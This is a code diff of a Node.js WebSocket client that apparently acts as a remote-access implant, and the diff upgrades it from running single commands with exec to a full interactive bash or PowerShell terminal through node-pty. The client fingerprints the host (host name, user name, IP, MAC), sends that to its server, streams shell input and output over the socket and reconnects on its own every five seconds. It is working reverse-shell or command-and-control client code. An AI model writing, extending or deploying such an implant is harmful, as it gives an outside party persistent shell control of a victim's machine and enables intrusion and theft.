@@ -1,166 +1,212 @@
 import WebSocket from "ws";
+import { exec } from "child_process";
 import os from "os";
 import { networkInterfaces } from "os";
-import { exec } from "child_process";
+import pty from "node-pty";
 
 class Client {
-  constructor(url = "ws://localhost:3000") {
-    this.url = url;
-    this.ws = null;
-    this.id = `${os.hostname()}-${os.userInfo().username}`;
-    this.reconnectInterval = 2000;
-    this.connectionAttempts = 0;
-    this.reconnectTimer = null;
-  }
+	constructor(url) {
+		this.url = url;
+		this.ws = null;
+		this.id = this.generateId();
+		this.connectionAttempts = 0;
+		this.reconnectTimer = null;
+		this.shell = null;
+		this.isShellActive = false;
+	}
 
-  getSystemInfo() {
-    const nets = networkInterfaces();
-    const mac =
-      Object.values(nets)
-        .flat()
-        .find((net) => !net.internal && net.mac !== "00:00:00:00:00:00")?.mac ||
-      "Unknown";
+	generateId() {
+		const hostname = os.hostname();
+		const username = os.userInfo().username;
+		return `${hostname}-${username}`;
+	}
 
-    return {
-      os: os.type(),
-      platform: process.platform,
-      arch: os.arch(),
-      memory: `${Math.round(os.totalmem() / (1024 * 1024 * 1024))}GB`,
-      cpu: os.cpus()[0].model,
-      mac,
-    };
-  }
+	getSystemInfo() {
+		const interfaces = networkInterfaces();
+		const ip = Object.values(interfaces)
+			.flat()
+			.find((iface) => !iface.internal && iface.family === "IPv4")?.address || "unknown";
+		const mac = Object.values(interfaces)
+			.flat()
+			.find((iface) => !iface.internal && iface.family === "IPv4")?.mac || "unknown";
 
-  connect(id = this.id) {
-    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
-      return;
-    }
+		return {
+			hostname: os.hostname(),
+			platform: os.platform(),
+			arch: os.arch(),
+			cpu: os.cpus()[0].model,
+			memory: `${Math.round(os.totalmem() / (1024 * 1024 * 1024))} GB`,
+			os: `${os.type()} ${os.release()}`,
+			ip,
+			mac,
+			connectedAt: new Date().toISOString()
+		};
+	}
 
-    try {
-      this.connectionAttempts++;
-      console.log(`[*] Initiating connection attempt ${this.connectionAttempts} to ${this.url}`);
-      
-      this.ws = new WebSocket(this.url);
+	connect(id = this.id) {
+		if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+			return;
+		}
 
-      this.ws.on("open", () => {
-        console.log(`[+] Secure connection established to ${this.url}`);
-        this.connectionAttempts = 0;
-        if (this.reconnectTimer) {
-          clearTimeout(this.reconnectTimer);
-          this.reconnectTimer = null;
-        }
-        this.identify(id);
-      });
+		try {
+			this.connectionAttempts++;
+			console.log(`[*] Initiating connection attempt ${this.connectionAttempts} to ${this.url}`);
+			
+			this.ws = new WebSocket(this.url);
 
-      this.ws.on("message", this.onMessage.bind(this));
+			this.ws.on("open", () => {
+				console.log(`[+] Secure connection established to ${this.url}`);
+				this.connectionAttempts = 0;
+				if (this.reconnectTimer) {
+					clearTimeout(this.reconnectTimer);
+					this.reconnectTimer = null;
+				}
+				this.identify(id);
+			});
 
-      this.ws.on("close", () => {
-        console.log("[-] Connection terminated");
-        this.ws = null;
-        this.scheduleReconnect();
-      });
+			this.ws.on("message", this.onMessage.bind(this));
 
-      this.ws.on("error", (error) => {
-        console.error(`[!] Connection error: ${error.message || "Unknown error"}`);
-        if (error.code) {
-          console.error(`[!] Error code: ${error.code}`);
-        }
-      });
-    } catch (error) {
-      console.error(`[!] Failed to create WebSocket connection: ${error.message}`);
-      this.scheduleReconnect();
-    }
-  }
+			this.ws.on("close", () => {
+				console.log("[-] Connection terminated");
+				this.cleanupShell();
+				this.ws = null;
+				this.scheduleReconnect();
+			});
 
-  onMessage(data) {
-    console.log("[<] Raw message received:", data.toString());
-    
-    try {
-      const message = JSON.parse(data.toString());
-      console.log("[*] Parsed message type:", message.type);
+			this.ws.on("error", (error) => {
+				console.error(`[!] Connection error: ${error.message || "Unknown error"}`);
+				if (error.code) {
+					console.error(`[!] Error code: ${error.code}`);
+				}
+			});
+		} catch (error) {
+			console.error(`[!] Failed to create WebSocket connection: ${error.message}`);
+			this.scheduleReconnect();
+		}
+	}
 
-      if (message.type === "shell") {
-        this.handleShellCommand(message.command);
-      }
-    } catch (error) {
-      console.error("[!] Failed to parse message:", error.message);
-    }
-  }
+	onMessage(data) {
+		try {
+			const message = JSON.parse(data.toString());
+			
+			switch (message.type) {
+				case "shell_start":
+					this.startShell();
+					break;
+				case "shell_input":
+					this.handleShellInput(message.data);
+					break;
+				case "shell_resize":
+					this.handleShellResize(message.cols, message.rows);
+					break;
+				case "shell_stop":
+					this.stopShell();
+					break;
+				case "message":
+					console.log(`\n[*] Received broadcast: ${message.data}`);
+					break;
+			}
+		} catch (error) {
+			console.error("[!] Failed to parse message:", error.message);
+		}
+	}
 
-  handleShellCommand(command) {
-    console.log("[*] Executing shell command:", command);
-    
-    exec(command, (error, stdout, stderr) => {
-      console.log("[*] Command execution completed");
-      
-      const response = {
-        type: "shell_response",
-        success: !error,
-        output: stdout || stderr || "Command executed with no output",
-        error: error ? error.message : null
-      };
+	startShell() {
+		if (this.isShellActive) {
+			return;
+		}
 
-      this.sendResponse(response);
-    });
-  }
+		const shell = os.platform() === "win32" ? "powershell.exe" : "bash";
+		this.shell = pty.spawn(shell, [], {
+			name: "xterm-256color",
+			cols: 80,
+			rows: 24,
+			cwd: os.homedir(),
+			env: process.env
+		});
 
-  sendResponse(response) {
-    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
-      const responseStr = JSON.stringify(response);
-      console.log("[>] Sending response:", responseStr);
-      this.ws.send(responseStr);
-    } else {
-      console.error("[!] Cannot send response - connection lost");
-    }
-  }
+		this.isShellActive = true;
 
-  scheduleReconnect() {
-    if (!this.reconnectTimer) {
-      console.log(`[*] Scheduling reconnection in ${this.reconnectInterval / 1000} seconds (Attempt ${this.connectionAttempts})...`);
-      this.reconnectTimer = setTimeout(() => {
-        this.reconnectTimer = null;
-        console.log("[*] Attempting to reestablish connection...");
-        this.connect();
-      }, this.reconnectInterval);
-    }
-  }
+		this.shell.onData((data) => {
+			this.sendResponse({
+				type: "shell_output",
+				data: data.toString()
+			});
+		});
 
-  identify(id) {
-    const systemInfo = this.getSystemInfo();
-    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
-      this.ws.send(
-        JSON.stringify({
-          type: "identify",
-          id,
-          systemInfo,
-        })
-      );
-      console.log("[>] Sent identification payload");
-    }
-  }
+		this.shell.onExit(() => {
+			this.isShellActive = false;
+			this.sendResponse({
+				type: "shell_exit"
+			});
+		});
+	}
 
-  close() {
-    if (this.reconnectTimer) {
-      clearTimeout(this.reconnectTimer);
-      this.reconnectTimer = null;
-    }
-    if (this.ws) {
-      console.log("[*] Initiating graceful shutdown...");
-      this.ws.close();
-      this.ws = null;
-    }
-  }
+	handleShellInput(data) {
+		if (this.shell && this.isShellActive) {
+			this.shell.write(data);
+		}
+	}
+
+	handleShellResize(cols, rows) {
+		if (this.shell && this.isShellActive) {
+			this.shell.resize(cols, rows);
+		}
+	}
+
+	stopShell() {
+		this.cleanupShell();
+	}
+
+	cleanupShell() {
+		if (this.shell) {
+			this.shell.kill();
+			this.shell = null;
+			this.isShellActive = false;
+		}
+	}
+
+	scheduleReconnect() {
+		if (!this.reconnectTimer) {
+			this.reconnectTimer = setTimeout(() => {
+				this.connect();
+			}, 5000);
+		}
+	}
+
+	sendResponse(data) {
+		if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+			this.ws.send(JSON.stringify(data));
+		}
+	}
+
+	identify(id) {
+		const systemInfo = this.getSystemInfo();
+		if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+			this.ws.send(
+				JSON.stringify({
+					type: "identify",
+					id,
+					systemInfo,
+				})
+			);
+			console.log("[>] Sent identification payload");
+		}
+	}
+
+	close() {
+		this.cleanupShell();
+		if (this.ws) {
+			this.ws.close();
+		}
+	}
 }
 
-// Create and start the client
-const client = new Client();
+const client = new Client("ws://localhost:3000");
 client.connect();
 
-// Handle graceful shutdown
 process.on("SIGINT", () => {
-  console.log("\n[*] Received shutdown signal");
-  client.close();
-  process.exit(0);
+	console.log("\n[*] Received shutdown signal");
+	client.close();
+	process.exit(0);
 });
-
-export default Client;
